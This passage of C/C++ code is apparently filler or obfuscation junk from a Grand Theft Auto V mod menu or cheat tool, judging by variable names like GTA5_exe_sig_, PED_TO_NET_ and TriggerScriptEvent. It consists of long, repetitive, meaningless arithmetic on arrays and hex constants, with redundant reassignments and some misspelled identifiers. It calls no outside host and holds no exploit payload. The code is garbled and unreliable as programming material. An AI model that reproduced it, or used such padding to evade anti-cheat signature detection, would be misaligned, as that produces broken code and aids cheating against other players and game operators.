				offset = (ponteiro * 0xA) + (0xB1231 * 0xA) - offset / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
				offset = (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - offset + aaaaaa;
				offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (ponteiro * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - ponteiro + 0xA12;
				offset = (ponteiro * 0xA) + (matriz[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (ponteiro * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = ponteiro * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (ponteiro * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			offset = (0xB1231 * 0xA12) + (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + ponteiro + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			matriz[2] = (ponteiro * 0xA) + (0xB1231 * 0xA) + offset / (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			offset = (ponteiro + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + offset + aaaaaa;
			offset = (0xA12 * 0xA) + matriz[2] * (ponteiro * 0xA) + (ponteiro * 0xA) + offset;
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (ponteiro * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			offset = (ponteiro * 0xA) + (matriz[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (matriz[1] > aaaaaa)
			{
				matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[2] + aaaaaa;
				matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1];
				matriz[5] = (0xB1231 * 0xA12) + (matriz[1] * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + 0xA12;
				matriz[7] = (0xB1231 * 0xA) + matriz[2];
				a1 = (-matriz[3] + (65)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (22)) / (2 * matriz[2]);
			}
			else
			{
				matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - matriz[1] / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - matriz[1] + aaaaaa;
				matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - matriz[1];
				matriz[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (matriz[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) - 0xBB;
				matriz[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-matriz[3] + (4)) / (2 * matriz[2]);
				a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			}
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (5)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-matriz[3] + (2)) / (2 * matriz[2]);
			a2 = (-matriz[4] - (2)) / (2 * matriz[2]);
			a = 0.0f;
			b = 0.0f;
			if (matriz[4] > 50.0f)
			{
				matriz[4] = matriz[1];
			}
			a2 = (matriz[4]) / (2 * matriz[2]);
			a1 = (matriz[3] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (matriz[2] * 0xA) + (0xB2 * 0xA) - matriz[1];
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (matriz[3] + (5)) / (2 * matriz[2]);
			aaaaaa = 0xB2 * 2;
			a = 0.0f;
			a1 = (matriz[3] + (4)) / (2 * matriz[2]);
			b = 0.0f;
			matriz[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[2] + aaaaaa;
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			matriz[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			matriz[5] = (0xB1231 * 0xA12) + (matriz[1] + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + 0xA12;
			matriz[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			matriz[4] = matriz[1];
			matriz[7] = (0xB1231 * 0xA) + matriz[2];
			matriz[1] = (0xB2 + 0xA) + (matriz[2] * 0xA) + (0xB1231 * 0xA) + matriz[1] + aaaaaa;
			matriz[1] = (0xA12 * 0xA) + matriz[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + matriz[1];
			matriz[4] = (0xA12 * 0xA) + matrizss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + matriz[1];
			a2 = (matriz[4] + (3)) / (2 * matriz[2]);
			a2 = (matriz[4] + (2)) / (2 * matriz[2]);
			matriz[1] = (0xB2 * 0xA) + (matriz[2] * 0xA) * 0xBB;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			matriz[1] = (0xB1231 * 0xA) + 0xA12;
			if (matriz[1] > aaaaaa)
			{
			}
			else
				a1 = (matriz[3] + (65)) / (2 * matriz[2]);
			a2 = (matriz[4] - (3)) / (2 * matriz[2]);

			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			GTA5_exe_sig_[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			offset = (PED_TO_NET_ + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			offset = (PED_TO_NET_ * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);

			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + 0xA12;
				GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
				a1 = (-GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (22)) / (2 * GTA5_exe_sig_[2]);
			}
			else
			{
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
				GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) - 0xBB;
				GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
				a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			}
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			a2 = (-GTA5_exe_sig_[4] - (2)) / (2 * GTA5_exe_sig_[2]);
			a = 0.0f;
			b = 0.0f;
			if (GTA5_exe_sig_[4] > 50.0f)
			{
				GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			}
			a2 = (GTA5_exe_sig_[4]) / (2 * GTA5_exe_sig_[2]);
			a1 = (GTA5_exe_sig_[3] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (GTA5_exe_sig_[2] * 0xA) + (0xB2 * 0xA) - GTA5_exe_sig_[1];
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (GTA5_exe_sig_[3] + (5)) / (2 * GTA5_exe_sig_[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (GTA5_exe_sig_[3] + (4)) / (2 * GTA5_exe_sig_[2]);
			b = 0.0f;
			GTA5_exe_sig_[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			GTA5_exe_sig_[5] = (0xB1231 * 0xA12) + (GTA5_exe_sig_[1] + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + 0xA12;
			GTA5_exe_sig_[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = GTA5_exe_sig_[1];
			GTA5_exe_sig_[7] = (0xB1231 * 0xA) + GTA5_exe_sig_[2];
			GTA5_exe_sig_[1] = (0xB2 + 0xA) + (GTA5_exe_sig_[2] * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			GTA5_exe_sig_[1] = (0xA12 * 0xA) + GTA5_exe_sig_[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + GTA5_exe_sig_[1];
			GTA5_exe_sig_[4] = (0xA12 * 0xA) + GTA5_exe_sig_ss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + GTA5_exe_sig_[1];
			a2 = (GTA5_exe_sig_[4] + (3)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] + (2)) / (2 * GTA5_exe_sig_[2]);
			GTA5_exe_sig_[1] = (0xB2 * 0xA) + (GTA5_exe_sig_[2] * 0xA) * 0xBB;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			GTA5_exe_sig_[1] = (0xB1231 * 0xA) + 0xA12;
			if (GTA5_exe_sig_[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (GTA5_exe_sig_[3] + (65)) / (2 * GTA5_exe_sig_[2]);
			a2 = (GTA5_exe_sig_[4] - (3)) / (2 * GTA5_exe_sig_[2]);


			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset;
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) - offset / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - offset + NETWORK_GET_ENTITY_IS_LOCAL_;
				offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) - offset;
				offset = (0xB1231 * 0xA12) + (PED_TO_NET_ * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - PED_TO_NET_ + 0xA12;
				offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				offset = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (5) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (PED_TO_NET_ * 0xA) - offset;
			offset = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = PED_TO_NET_ * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			offset = (0xB1231 * 0xA12) + (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + PED_TO_NET_ + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (offset + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + 0xA12;
			TriggerScriptEvent[2] = (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset / (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			offset = (PED_TO_NET_ + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + offset + NETWORK_GET_ENTITY_IS_LOCAL_;
			offset = (0xA12 * 0xA) + TriggerScriptEvent[2] * (PED_TO_NET_ * 0xA) + (PED_TO_NET_ * 0xA) + offset;
			TriggerScriptEvent[4] = (0xA12 * 0xA) + (PED_TO_NET_ * 0xA) + (0xB1231 * 0xA) + offset;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			offset = (PED_TO_NET_ * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			offset = (0xB1231 * 0xA) + 0xA12;
			offset = (0xB1231 * 0xA) + 0xA12;
			if (offset > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
			}
			else
				a1 = (TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);

			if (TriggerScriptEvent[1] > NETWORK_GET_ENTITY_IS_LOCAL_)
			{
				TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[3] = (0xB1231 * 0xA) - (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + 0xA12;
				TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
				a1 = (-TriggerScriptEvent[3] + (65)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (22)) / (2 * TriggerScriptEvent[2]);
			}
			else
			{
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
				TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
				TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 * 0xA) - (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) - 0xB2 + 0xA12;
				TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) - 0xBB;
				TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
				a1 = (-TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
				a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			}
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (-TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			a2 = (-TriggerScriptEvent[4] - (2)) / (2 * TriggerScriptEvent[2]);
			a = 0.0f;
			b = 0.0f;
			if (TriggerScriptEvent[4] > 50.0f)
			{
				TriggerScriptEvent[4] = TriggerScriptEvent[1];
			}
			a2 = (TriggerScriptEvent[4]) / (2 * TriggerScriptEvent[2]);
			a1 = (TriggerScriptEvent[3] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (0xB1231 * 0xA) / (TriggerScriptEvent[2] * 0xA) + (0xB2 * 0xA) - TriggerScriptEvent[1];
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			a1 = (TriggerScriptEvent[3] + (5)) / (2 * TriggerScriptEvent[2]);
			NETWORK_GET_ENTITY_IS_LOCAL_ = 0xB2 * 2;
			a = 0.0f;
			a1 = (TriggerScriptEvent[3] + (4)) / (2 * TriggerScriptEvent[2]);
			b = 0.0f;
			TriggerScriptEvent[3] = (0xB1231 * 0xA) + (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[2] + NETWORK_GET_ENTITY_IS_LOCAL_;
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB1231 * 0xA12) + (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + 0xB2 + 0xA12;
			TriggerScriptEvent[5] = (0xB1231 * 0xA12) + (TriggerScriptEvent[1] + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + 0xA12;
			TriggerScriptEvent[2] = (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] / (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = TriggerScriptEvent[1];
			TriggerScriptEvent[7] = (0xB1231 * 0xA) + TriggerScriptEvent[2];
			TriggerScriptEvent[1] = (0xB2 + 0xA) + (TriggerScriptEvent[2] * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1] + NETWORK_GET_ENTITY_IS_LOCAL_;
			TriggerScriptEvent[1] = (0xA12 * 0xA) + TriggerScriptEvent[2] * (0xB2 * 0xA) + (0xB2 * 0xA) + TriggerScriptEvent[1];
			TriggerScriptEvent[4] = (0xA12 * 0xA) + TriggerScriptEventss[2] * (0xB2 * 0xA) + (0xB1231 * 0xA) + TriggerScriptEvent[1];
			a2 = (TriggerScriptEvent[4] + (3)) / (2 * TriggerScriptEvent[2]);
			a2 = (TriggerScriptEvent[4] + (2)) / (2 * TriggerScriptEvent[2]);
			TriggerScriptEvent[1] = (0xB2 * 0xA) + (TriggerScriptEvent[2] * 0xA) * 0xBB;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
			TriggerScriptEvent[1] = (0xB1231 * 0xA) + 0xA12;
